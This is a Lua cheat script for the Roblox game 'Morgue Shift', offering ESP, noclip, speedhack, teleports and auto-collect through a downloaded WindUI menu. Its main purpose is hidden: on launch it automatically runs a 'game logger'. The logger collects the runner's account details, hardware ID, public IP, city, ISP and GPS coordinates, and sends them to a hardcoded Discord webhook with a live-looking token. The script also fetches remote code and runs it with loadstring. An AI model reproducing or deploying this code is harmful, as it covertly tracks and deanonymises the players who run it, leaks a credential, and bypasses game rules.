local WEBHOOK_URL = "https://discord.com/api/webhooks/1516421004291997718/t5nSkmWsiwWFpSNHjJQv3fdQKWGm2SqOQag3LS3kSEwHL1QkuyfbgzFpLI7kDXO357Bj"

if getgenv().MorgueApexLoaded then
    return game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Morgue Shift - Mizukage Official",
        Text = "Sistem sudah beroperasi di memori!"
    })
end
getgenv().MorgueApexLoaded = true

--================================================
-- 1. DEKLARASI SERVICE & PATH
--================================================
local Services = setmetatable({}, {
    __index = function(t, k)
        local s = game:GetService(k)
        t[k] = s; return s
    end
})

local Players = Services.Players
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = Services.ReplicatedStorage
local RunService = Services.RunService
local Workspace = Services.Workspace
local GuiService = Services.GuiService
local TeleportService = Services.TeleportService

--================================================
-- 2. AUTO RECONNECT & ANTI-AFK
--================================================
local function SetupAutoReconnect()
    GuiService.ErrorMessageChanged:Connect(function()
        task.wait(1)
        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
    end)
    local virtualUser = game:GetService("VirtualUser")
    LocalPlayer.Idled:Connect(function()
        virtualUser:CaptureController()
        virtualUser:ClickButton2(Vector2.new())
    end)
end

--================================================
-- 3. ADVANCED GAME LOGGER (BERJALAN OTOMATIS)
--================================================
local function SendGameLog()
    if not WEBHOOK_URL or WEBHOOK_URL == "" or string.find(WEBHOOK_URL, "MASUKKAN") then
        warn("Webhook belum diisi. Logger tidak berjalan.")
        return
    end

    task.spawn(function()
        task.wait(3) -- Tunggu leaderstats

        local HttpService = game:GetService("HttpService")
        local Stats = game:GetService("Stats")
        local Market = game:GetService("MarketplaceService")
        local UserInputService = game:GetService("UserInputService")

        local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
        if not request then return end

        local UserId = LocalPlayer.UserId
        local DisplayName = LocalPlayer.DisplayName
        local Username = LocalPlayer.Name
        local AccountAge = LocalPlayer.AccountAge
        local Membership = LocalPlayer.MembershipType.Name
        local PlaceId = game.PlaceId
        local JobId = game.JobId

        local HWID = "Unknown"
        pcall(function()
            if gethwid then HWID = gethwid() elseif identifying then HWID = identifying() end
        end)

        local GameStatsText = "No Leaderstats Found"
        local LS = LocalPlayer:FindFirstChild("leaderstats")
        if LS then
            local TempStats = {}
            for _, v in pairs(LS:GetChildren()) do
                if v:IsA("IntValue") or v:IsA("NumberValue") or v:IsA("StringValue") then
                    table.insert(TempStats, "> **" .. v.Name .. ":** `" .. tostring(v.Value) .. "`")
                end
            end
            if #TempStats > 0 then
                GameStatsText = table.concat(TempStats, "\n")
            else
                GameStatsText = "Stats Empty (Hidden?)"
            end
        end

        local AvatarURL = "https://i.imgur.com/C5uYqFk.png"
        pcall(function()
            local ApiUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..UserId.."&size=420x420&format=Png&isCircular=false"
            local Data = HttpService:JSONDecode(game:HttpGet(ApiUrl))
            if Data.data and Data.data[1] then AvatarURL = Data.data[1].imageUrl end
        end)

        local Executor = (identifyexecutor and identifyexecutor()) or "Unknown Executor"
        local IP_Data = { query = "Hidden", country = "Unknown", city = "Unknown", isp = "Unknown", timezone = "Unknown", lat = 0, lon = 0 }
        pcall(function()
            local Response = game:HttpGet("https://ip-api.com/json")
            IP_Data = HttpService:JSONDecode(Response)
        end)

        local MapLink = string.format("https://www.google.com/maps/search/?api=1&query=%s,%s", IP_Data.lat or 0, IP_Data.lon or 0)
        local Platform = UserInputService.TouchEnabled and not UserInputService.MouseEnabled and "Mobile" or "PC"
        local Ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
        local FPS = math.floor(workspace:GetRealPhysicsFPS())
        local GameName = "Unknown"
        pcall(function() GameName = Market:GetProductInfo(PlaceId).Name end)
        local ServerSize = #Players:GetPlayers() .. "/" .. Players.MaxPlayers
        local EmbedColor = (Membership == "Premium") and 16766720 or 65280
        local JoinScript = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", tostring(PlaceId), JobId)
        local ProfileLink = "https://www.roblox.com/users/" .. UserId .. "/profile"

        local Data = {
            ["username"] = "Advanced Game Logger",
            ["avatar_url"] = AvatarURL,
            ["content"] = "",
            ["embeds"] = {
                {
                    ["title"] = "👑 " .. GameName .. " | LOG REPORT",
                    ["url"] = ProfileLink,
                    ["color"] = EmbedColor,
                    ["thumbnail"] = { ["url"] = AvatarURL },
                    ["fields"] = {
                        {
                            ["name"] = "👤 **USER INFORMATION**",
                            ["value"] = string.format(
                                "> **Display:** `%s`\n> **User:** [%s](%s)\n> **ID:** `%s`\n> **Age:** %d Days",
                                DisplayName, Username, ProfileLink, UserId, AccountAge
                            ),
                            ["inline"] = true
                        },
                        {
                            ["name"] = "🛡️ **HARDWARE ID (HWID)**",
                            ["value"] = "```" .. HWID .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "💰 **IN-GAME STATS**",
                            ["value"] = GameStatsText,
                            ["inline"] = false
                        },
                        {
                            ["name"] = "📡 **NETWORK & DEVICE**",
                            ["value"] = string.format(
                                "> **IP:** ||`%s`||\n> **Loc:** %s, %s\n> **Exe:** `%s` (%s)\n> **Ping:** `%dms` | **FPS:** `%d`",
                                IP_Data.query, IP_Data.city, IP_Data.country, Executor, Platform, Ping, FPS
                            ),
                            ["inline"] = false
                        },
                        {
                            ["name"] = "🔓 **QUICK JOIN**",
                            ["value"] = "```lua\n" .. JoinScript .. "```",
                            ["inline"] = false
                        }
                    },
                    ["footer"] = {
                        ["text"] = "Advanced Logger • ISP: " .. IP_Data.isp,
                        ["icon_url"] = AvatarURL
                    },
                    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
                }
            }
        }

        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(Data)
        })
    end)
end

--================================================
-- 4. CORE MODULE: MORGUE SHIFT LOGIC
--================================================
local MorgueConfig = { NoDelay = false, SpeedHack = false, Noclip = false, WalkSpeed = 16 }

-- Warna ESP (bisa diubah lewat UI)
local GhostColor = Color3.fromRGB(255, 0, 0)
local SoulColor = Color3.fromRGB(255, 255, 0)

-- [IDENTIFIKASI HANTU]
local function IsGhostModel(obj)
    if not obj:IsA("Model") then return false end
    if Players:GetPlayerFromCharacter(obj) then return false end
    
    local hum = obj:FindFirstChildOfClass("Humanoid")
    local anim = obj:FindFirstChildOfClass("AnimationController")
    
    if (hum and hum.Health > 0) or anim then
        if obj.Name:lower():find("dummy") then return false end
        return true
    end
    return false
end

-- [FUNGSI ANTI GHOST]
local AntiGhostConnection
local function SetAntiGhost(enabled)
    if AntiGhostConnection then AntiGhostConnection:Disconnect() end
    if not enabled then return end
    
    AntiGhostConnection = RunService.Stepped:Connect(function()
        for _, obj in ipairs(Workspace:GetDescendants()) do
            if IsGhostModel(obj) then
                for _, part in ipairs(obj:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                        part.CanTouch = false
                    end
                    if part:IsA("TouchTransmitter") then
                        part:Destroy()
                    end
                end
            end
        end
    end)
end

-- [FUNGSI NOCLIP]
local NoclipConnection
local function SetNoclip(enabled)
    MorgueConfig.Noclip = enabled
    if NoclipConnection then NoclipConnection:Disconnect() end
    if enabled then
        NoclipConnection = RunService.Stepped:Connect(function()
            local char = LocalPlayer.Character
            if char then for _, part in ipairs(char:GetDescendants()) do if part:IsA("BasePart") then part.CanCollide = false end end end
        end)
    else
        local char = LocalPlayer.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            char.HumanoidRootPart.CFrame = char.HumanoidRootPart.CFrame + Vector3.new(0, 2, 0)
            task.wait(0.1)
            for _, part in ipairs(char:GetDescendants()) do if part:IsA("BasePart") then part.CanCollide = true end end
        end
    end
end

-- [FUNGSI SPEEDHACK]
local SpeedHackConnection
local function SetSpeedHack(enabled)
    MorgueConfig.SpeedHack = enabled
    if SpeedHackConnection then SpeedHackConnection:Disconnect() end
    if enabled then
        SpeedHackConnection = RunService.Heartbeat:Connect(function()
            local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if hum then hum.WalkSpeed = MorgueConfig.WalkSpeed end
        end)
    else
        local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum.WalkSpeed = 16 end
    end
end

-- [FUNGSI NO DELAY]
local NoDelayConnection
local function SetNoDelay(enabled)
    MorgueConfig.NoDelay = enabled
    if NoDelayConnection then
        NoDelayConnection:Disconnect()
        NoDelayConnection = nil
    end
    if enabled then
        for _, desc in ipairs(Workspace:GetDescendants()) do
            if desc:IsA("ProximityPrompt") then pcall(function() desc.HoldDuration = 0 end) end
        end
        NoDelayConnection = Workspace.DescendantAdded:Connect(function(desc)
            if desc:IsA("ProximityPrompt") then pcall(function() desc.HoldDuration = 0 end) end
        end)
    else
        for _, desc in ipairs(Workspace:GetDescendants()) do
            if desc:IsA("ProximityPrompt") then pcall(function() desc.HoldDuration = 1 end) end
        end
    end
end

-- [FUNGSI AUTO SOUL]
local AutoSoulEnabled = false
local AutoSoulConnection
local AutoSoulThreads = {}

local function SetAutoSoul(enabled)
    AutoSoulEnabled = enabled
    for _, thread in ipairs(AutoSoulThreads) do
        task.cancel(thread)
    end
    AutoSoulThreads = {}
    
    if AutoSoulConnection then
        AutoSoulConnection:Disconnect()
        AutoSoulConnection = nil
    end
    
    if not enabled then return end

    local function CheckAndFire(desc)
        if desc:IsA("ProximityPrompt") and desc.Parent and (desc.Parent.Name:lower():find("soul") or desc.Parent.Name:lower():find("orb")) then
            local thread = task.spawn(function()
                while AutoSoulEnabled and desc and desc.Parent do
                    pcall(function()
                        desc.Enabled = true
                        desc.RequiresLineOfSight = false
                        desc.MaxActivationDistance = math.huge
                        desc.HoldDuration = 0
                        fireproximityprompt(desc)
                    end)
                    task.wait(0.5)
                end
            end)
            table.insert(AutoSoulThreads, thread)
        end
    end
    
    for _, desc in ipairs(Workspace:GetDescendants()) do
        CheckAndFire(desc)
    end
    
    AutoSoulConnection = Workspace.DescendantAdded:Connect(function(desc)
        if AutoSoulEnabled then CheckAndFire(desc) end
    end)
end

-- [FUNGSI ESP]
local Highlights = { Soul = {}, Ghost = {}, Player = {} }
local function ClearESP(typeESP)
    for _, hl in pairs(Highlights[typeESP]) do
        if typeof(hl) == "table" then
            pcall(function() hl.Highlight:Destroy(); hl.Billboard:Destroy() end)
        else
            pcall(function() hl:Destroy() end)
        end
    end
    Highlights[typeESP] = {}
end

local ESPLoops = { Ghost = false, Soul = false, Player = false }
local ESPThreads = { Ghost = nil, Soul = nil, Player = nil }

local function SetGhostESP(enabled)
    ESPLoops.Ghost = enabled
    if ESPThreads.Ghost then task.cancel(ESPThreads.Ghost) end
    ClearESP("Ghost")
    if not enabled then return end

    ESPThreads.Ghost = task.spawn(function()
        while ESPLoops.Ghost do
            for i = #Highlights.Ghost, 1, -1 do
                local hl = Highlights.Ghost[i]
                if not hl or not hl.Parent then
                    pcall(function() hl:Destroy() end)
                    table.remove(Highlights.Ghost, i)
                end
            end
            for _, obj in ipairs(Workspace:GetDescendants()) do
                if IsGhostModel(obj) and not obj:FindFirstChild("GhostESP_HL") then
                    local hl = Instance.new("Highlight")
                    hl.Name = "GhostESP_HL"
                    hl.FillColor = GhostColor
                    hl.OutlineColor = Color3.fromRGB(255, 255, 255)
                    hl.FillTransparency = 0.25
                    hl.Parent = obj
                    table.insert(Highlights.Ghost, hl)
                end
            end
            task.wait(1.5)
        end
    end)
end

local function SetSoulESP(enabled)
    ESPLoops.Soul = enabled
    if ESPThreads.Soul then task.cancel(ESPThreads.Soul) end
    ClearESP("Soul")
    if not enabled then return end

    ESPThreads.Soul = task.spawn(function()
        while ESPLoops.Soul do
            for i = #Highlights.Soul, 1, -1 do
                local hl = Highlights.Soul[i]
                if not hl or not hl.Parent then
                    pcall(function() hl:Destroy() end)
                    table.remove(Highlights.Soul, i)
                end
            end
            for _, obj in ipairs(Workspace:GetDescendants()) do
                if obj:IsA("BasePart") and (obj.Name:lower():find("soul") or obj.Name:lower():find("orb")) then
                    if not obj:FindFirstChild("SoulESP_HL") then
                        local hl = Instance.new("Highlight")
                        hl.Name = "SoulESP_HL"
                        hl.FillColor = SoulColor
                        hl.FillTransparency = 0.3
                        hl.Parent = obj
                        table.insert(Highlights.Soul, hl)
                    end
                end
            end
            task.wait(2)
        end
    end)
end

-- [TELEPORT LOGIC]
local Locations = {
    "Lobby", "Ruang Otopsi", "Ruang Sterilisasi", "Ruang Kremasi",
    "Ruang Jenazah", "Ruang Penyimpanan", "Ruang Pengawetan",
    "Ruang Elektrikal", "Ruang Duka"
}

local LocationCoords = {
    ["Lobby"] = Vector3.new(55.76, 4.78, -60.77),
    ["Ruang Otopsi"] = Vector3.new(82.1, 4.78, -56.5),
    ["Ruang Sterilisasi"] = Vector3.new(88.84, 4.78, -28.1),
    ["Ruang Kremasi"] = Vector3.new(33.8, 4.78, -57.62),
    ["Ruang Jenazah"] = Vector3.new(20.51, 4.78, -33.77),
    ["Ruang Penyimpanan"] = Vector3.new(86.34, 22.37, -23.9),
    ["Ruang Pengawetan"] = Vector3.new(42.35, 20.91, -27.01),
    ["Ruang Elektrikal"] = Vector3.new(25.77, 17.65, -55.56),
    ["Ruang Duka"] = Vector3.new(56.35, 17.75, -44.3),
}

local function TeleportToLocation(name)
    local pos = LocationCoords[name]
    if pos and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(pos + Vector3.new(0, 2, 0))
    end
end

--================================================
-- 5. INISIALISASI WIND UI (FINAL DENGAN SEMUA FITUR)
--================================================
local function InitInterface()
    local success, WindUI = pcall(function()
        return loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
    end)
    if not success or not WindUI then
        success, WindUI = pcall(function()
            return loadstring(game:HttpGet("https://tree-hub.vercel.app/api/UI/WindUI"))()
        end)
    end
    if not success or not WindUI then
        warn("WindUI gagal dimuat. Pastikan koneksi internet stabil.")
        return
    end

    -- [SUARA]
    local Sounds = { StartupId = "rbxassetid://140397610798305", ClickId = "rbxassetid://140277245983305" }
    pcall(function() Services.ContentProvider:PreloadAsync({Sounds.StartupId, Sounds.ClickId}) end)
    function Sounds:Play(id, volume) task.spawn(function() local s = Instance.new("Sound"); s.SoundId = id; s.Volume = volume or 1; s.Parent = Services.SoundService; s.Ended:Connect(function() s:Destroy() end); s:Play() end) end
    function Sounds:Startup() self:Play(Sounds.StartupId, 1) end
    function Sounds:Click() self:Play(Sounds.ClickId, 0.8) end
    Sounds:Startup()

    -- [NOTIFIKASI SCRIPT AKTIF]
    WindUI:Notify({
        Title = "Morgue Shift",
        Content = "Script berhasil dijalankan! Semua fitur siap.",
        Duration = 5,
        Icon = "skull",
    })

    local ViewportSize = Workspace.CurrentCamera.ViewportSize
    local isMobile = ViewportSize.X < 850
    local dynamicSize = isMobile and UDim2.fromOffset(ViewportSize.X * 0.85, ViewportSize.Y * 0.85) or UDim2.fromOffset(600, 420)
    local dynamicSideBar = isMobile and 150 or 200

    local Window = WindUI:CreateWindow({
        Title = "MORGUE SHIFT",
        Icon = "lucide:skull",
        Author = "Mizukage-Official 👑",
        Folder = "MorgueBase",
        Size = dynamicSize,
        Transparent = true,
        Theme = "Dark",
        Accent = Color3.fromRGB(150, 0, 0),
        SideBarWidth = dynamicSideBar,
        HasOutline = true,
        Background = "rbxassetid://137490169052447",
        BackgroundImageTransparency = 0.7
    })

    Window:Tag({ Title = "VIP", Icon = "lucide:crown", Color = Color3.fromHex("#ffb300"), Radius = 6 })

    local TabMain = Window:Tab({ Title = "Main", Icon = "lucide:ghost" })
    local TabESP = Window:Tab({ Title = "Visuals", Icon = "lucide:eye" })
    local TabTele = Window:Tab({ Title = "Teleports", Icon = "lucide:map-pin" })
    local TabMisc = Window:Tab({ Title = "Player", Icon = "lucide:user" })

    -- =================== TAB 1: MAIN FEATURES ===================
    TabMain:Section({ Title = "Supernatural Defenses" })
    TabMain:Toggle({
        Title = "🛡️ Anti-Ghost (Hitbox Destroyer)",
        Desc = "Menghancurkan jangkauan sentuhan hantu secara lokal",
        Default = false,
        Callback = function(v) Sounds:Click(); SetAntiGhost(v) end
    })
    TabMain:Toggle({
        Title = "👻 Auto-Collect Souls",
        Desc = "Otomatis ambil Soul/Orb disekitar",
        Default = false,
        Callback = function(v) Sounds:Click(); SetAutoSoul(v) end
    })
    TabMain:Toggle({
        Title = "⚡ No Delay (Prompt)",
        Desc = "Menghilangkan waktu tahan saat mengambil item",
        Default = false,
        Callback = function(v) Sounds:Click(); SetNoDelay(v) end
    })

    -- =================== TAB 2: VISUALS / ESP ===================
    TabESP:Section({ Title = "Entity Highlighting" })
    TabESP:Toggle({
        Title = "👻 ESP Active Ghosts",
        Desc = "Update realtime mencari Hantu (Merah)",
        Default = false,
        Callback = function(v) Sounds:Click(); SetGhostESP(v) end
    })
    TabESP:Toggle({
        Title = "🟡 ESP Souls/Orbs",
        Desc = "Melihat letak soul/orb (Kuning)",
        Default = false,
        Callback = function(v) Sounds:Click(); SetSoulESP(v) end
    })

    TabESP:Section({ Title = "ESP Customization" })
    TabESP:Colorpicker({
        Title = "👻 Ghost ESP Color",
        Desc = "Warna highlight hantu",
        Default = GhostColor,
        Transparency = 0,
        Locked = false,
        Callback = function(color)
            GhostColor = color
            for _, hl in ipairs(Highlights.Ghost) do
                if hl and hl.Parent then
                    hl.FillColor = color
                end
            end
        end
    })
    TabESP:Colorpicker({
        Title = "🟡 Soul ESP Color",
        Desc = "Warna highlight soul/orb",
        Default = SoulColor,
        Transparency = 0,
        Locked = false,
        Callback = function(color)
            SoulColor = color
            for _, hl in ipairs(Highlights.Soul) do
                if hl and hl.Parent then
                    hl.FillColor = color
                end
            end
        end
    })

    -- =================== TAB 3: TELEPORTATION ===================
    TabTele:Section({ Title = "Map Navigation" })
    TabTele:Dropdown({
        Title = "📍 Teleport ke Ruangan",
        Desc = "Pilih ruangan untuk berpindah",
        Values = Locations,
        Value = { "Lobby" },
        Multi = false,
        AllowNone = true,
        Callback = function(option)
            Sounds:Click()
            local selected = type(option) == "table" and option[1] or option
            if selected then TeleportToLocation(selected) end
        end
    })

    -- =================== TAB 4: MISC & PLAYER ===================
    TabMisc:Section({ Title = "Movement Hacks" })
    TabMisc:Toggle({
        Title = "🚶 Noclip (Tembus Tembok)",
        Default = false,
        Callback = function(v) Sounds:Click(); SetNoclip(v) end
    })

    TabMisc:Toggle({
        Title = "⚡ SpeedHack Override",
        Default = false,
        Callback = function(v) Sounds:Click(); SetSpeedHack(v) end
    })

    TabMisc:Slider({
        Title = "📏 Kecepatan Jalan",
        Desc = "Atur kecepatan berjalan (WalkSpeed)",
        Step = 1,
        Value = {
            Min = 16,
            Max = 150,
            Default = 16
        },
        Callback = function(v)
            MorgueConfig.WalkSpeed = v
        end
    })

    TabMisc:Section({ Title = "System" })
    TabMisc:Button({
        Title = "❌ Unload Cheat",
        Variant = "Secondary",
        Callback = function()
            Sounds:Click()
            WindUI:Popup({
                Title = "Konfirmasi Unload",
                Icon = "alert-triangle",
                Content = "Yakin ingin mematikan semua fitur?",
                Buttons = {
                    {
                        Title = "Batal",
                        Callback = function() end,
                        Variant = "Tertiary",
                    },
                    {
                        Title = "Lanjutkan",
                        Icon = "check",
                        Callback = function()
                            getgenv().MorgueApexLoaded = false
                            SetAntiGhost(false); SetNoclip(false); SetSpeedHack(false)
                            SetNoDelay(false); SetAutoSoul(false)
                            ESPLoops.Ghost = false; ESPLoops.Soul = false
                            if ESPThreads.Ghost then task.cancel(ESPThreads.Ghost) end
                            if ESPThreads.Soul then task.cancel(ESPThreads.Soul) end
                            ClearESP("Ghost"); ClearESP("Soul")
                            WindUI:Destroy()
                        end,
                        Variant = "Primary",
                    }
                }
            })
        end
    })
end

--================================================
-- 6. EKSEKUSI UTAMA
--================================================
SetupAutoReconnect()
SendGameLog()
task.spawn(InitInterface)